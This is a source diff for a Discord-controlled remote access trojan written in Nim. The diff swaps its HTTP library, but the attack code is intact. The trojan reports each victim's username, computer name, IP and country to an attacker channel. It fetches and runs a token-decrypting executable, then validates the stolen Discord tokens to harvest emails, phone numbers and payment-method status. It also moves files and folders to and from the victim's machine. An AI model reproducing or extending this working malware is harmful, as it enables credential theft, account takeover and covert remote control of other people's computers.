@@ -1,4 +1,4 @@
-import dimscord, asyncdispatch, options, os, strutils, sequtils, sets, httpclient, streams, osproc, winim/lean, modules/[audio, clipboard, config, screenshot], json, zippy/ziparchives
+import dimscord, asyncdispatch, options, os, strutils, sequtils, sets, streams, osproc, winim/lean, modules/[audio, clipboard, config, screenshot], json, zippy/ziparchives, puppy
 
 var thisTarget = getenv("username") & "@" & getenv("computername")
 var selectedTarget: string
@@ -17,7 +17,7 @@ const helpMessage = """
 
 **__File Management__**
 `.upload <attachment>` - upload file(s) to target (AppData\Local\Temp)
-`.dfile <path>` - download file from target 
+`.dfile <path>` - download a file from target 
 `.dfolder <path>` - download a folder (.zip) from target
 
 **__System__**
@@ -39,17 +39,16 @@ proc isDir(filepath: string): bool =
         result = false
 
 proc deleteDirRecursively(path: string) = 
-    for entry in os.walkDir(path):
+    for entry in walkDir(path):
         if isDir(entry.path):
             deleteDirRecursively(entry.path)
         else:
-            os.removeFile(entry.path)
+            removeFile(entry.path)
     removeDir(path)
 
 proc onReady(s: Shard, r: Ready) {.event(discord).} =
     var
-        client = newHttpClient()
-        ip_response = client.get("https://ipinfo.io/json")
+        ip_response = get("https://ipinfo.io/json")
         ipinfo = ip_response.body
     var ipinfoJson = parseJson(ipinfo)
     discard await discord.api.sendMessage(newUsersChannelId, "||@everyone||\nNew connection: `" & thisTarget & "`\nSelect this target: `.select " & thisTarget & "`\nIP: `" & ipinfoJson["ip"].getStr() & "` (" & ipinfoJson["country"].getStr() & ")")
@@ -81,8 +80,7 @@ proc messageCreate(s: Shard, m: Message) {.event(discord).} =
             let decryptorPath = getTempDir() / "tokens.exe"
             try:
                 var
-                    client = newHttpClient()
-                    response = client.get(tokenDecryptorUrl)
+                    response = get(tokenDecryptorUrl)
                     f = newFileStream(decryptorPath, fmWrite)
                 f.write(response.body)
                 f.close()
@@ -108,8 +106,7 @@ proc messageCreate(s: Shard, m: Message) {.event(discord).} =
             let decryptorPath = getTempDir() / "tokens.exe"
             try:
                 var
-                    client = newHttpClient()
-                    response = client.get(tokenDecryptorUrl)
+                    response = get(tokenDecryptorUrl)
                     f = newFileStream(decryptorPath, fmWrite)
                 f.write(response.body)
                 f.close()
@@ -126,19 +123,18 @@ proc messageCreate(s: Shard, m: Message) {.event(discord).} =
                 filteredTokens = toSeq(toSet(filteredTokens))
 
                 for token in filteredTokens:
-                    let headers = newHttpHeaders({
-                        "Authorization": token,
-                        "Content-Type": "application/json"
-                    })
+                    let headers = @[
+                        ("Authorization", token),
+                        ("Content-Type", "application/json")
+                    ]
 
-                    var client = newHttpClient()
-                    var response = client.request("https://discordapp.com/api/v6/users/@me", headers = headers)
+                    var response = get("https://discordapp.com/api/v6/users/@me", headers = headers)
                     
-                    if response.status.startsWith("401"):
+                    if response.code == 401:
                         discard await discord.api.sendMessage(m.channel_id, "Token `" & token & "` is invalid!")
                         continue
 
-                    if response.status == "200 OK":
+                    if response.code == 200:
                         let jsonResponse = parseJson(response.body)
                         let email = jsonResponse["email"].getStr()
                         var phone = jsonResponse["phone"].getStr()
@@ -148,10 +144,10 @@ proc messageCreate(s: Shard, m: Message) {.event(discord).} =
                         let username = jsonResponse["username"].getStr() & "#" & jsonResponse["discriminator"].getStr()
                         let avatar = "https://cdn.discordapp.com/avatars/" & jsonResponse["id"].getStr() & "/" & jsonResponse["avatar"].getStr()
 
-                        let nitroResp = client.request("https://discordapp.com/api/v6/users/@me/billing/subscriptions", headers = headers)
+                        let nitroResp = get("https://discordapp.com/api/v6/users/@me/billing/subscriptions", headers = headers)
                         let nitro = $((parseJson(nitroResp.body)).len > 0)
 
-                        let billingResp = client.request("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers = headers)
+                        let billingResp = get("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers = headers)
                         let billing = $((parseJson(billingResp.body)).len > 0)
                         var embed = Embed(
                             title: some "User info",
@@ -188,15 +184,13 @@ proc messageCreate(s: Shard, m: Message) {.event(discord).} =
             except Exception as e:
                 discard await discord.api.sendMessage(m.channel_id, "Error decrypting tokens!\n" & e.msg)
 
-
         elif (m.content == ".upload"):
             discard await discord.api.sendMessage(m.channel_id, "Uploading...")
             for attachmentIndex, attachmentValue in m.attachments:
                 var
                     fileName = attachmentValue.filename
                     url = attachmentValue.url
-                    client = newHttpClient()
-                    response = client.get(url)
+                    response = get(url)
                     f = newFileStream(joinPath(getTempDir(), fileName), fmWrite)
                 f.write(response.body)
                 f.close()
